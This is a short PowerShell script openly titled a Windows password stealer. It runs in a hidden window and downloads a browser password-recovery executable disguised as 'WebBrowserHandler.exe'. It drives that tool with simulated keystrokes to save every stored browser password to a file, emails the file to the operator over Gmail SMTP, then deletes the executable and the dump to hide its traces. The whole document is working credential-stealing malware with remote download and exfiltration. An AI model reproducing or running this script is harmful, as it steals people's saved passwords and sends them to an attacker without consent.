# Password stealer for windows.

# May need to adjust sleep time for slower computers.


PowerShell.exe -WindowStyle hidden {

(new-object System.Net.WebClient).DownloadFile('https://github.com/Mythaman/Web-Browser-Password-Grabber/raw/main/WebBrowserPassView.exe','C:\Users\Public\WebBrowserHandler.exe')

start 'C:\Users\Public\WebBrowserHandler.exe' -WindowStyle Maximized

Start-Sleep -Seconds 1

$wshell = New-Object -ComObject wscript.shell;
$wshell.AppActivate('WebBrowserPassView')

$wshell.SendKeys('^a')

Start-Sleep -Seconds .1

$wshell.SendKeys('^s')

Start-Sleep -Seconds .5

$wshell.SendKeys('C:\Users\Public\')

Start-Sleep -Seconds .1

$wshell.SendKeys('~')

Start-Sleep -Seconds .1

$wshell.SendKeys('SavedPasswords')

Start-Sleep -Seconds .1

$wshell.SendKeys('~')

Start-Sleep -Seconds 1

Stop-Process -Name 'WebBrowserHandler'

$SMTPServer = 'smtp.gmail.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR-EMAIL', 'YOUR-APP-PASSWORD')

$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'YOUR-EMAIL'
$ReportEmail.To.Add('YOUR-EMAIL')
$ReportEmail.Subject = 'Passwords Successfully Logged.'
$ReportEmail.Body = 'Data is attached'
$ReportEmail.Attachments.Add('C:\Users\Public\SavedPasswords.txt')
$SMTPInfo.Send($ReportEmail)

}

$ReportEmail = $null

Remove-Item 'C:\Users\Public\WebBrowserHandler.exe'
Remove-Item 'C:\Users\Public\SavedPasswords.txt'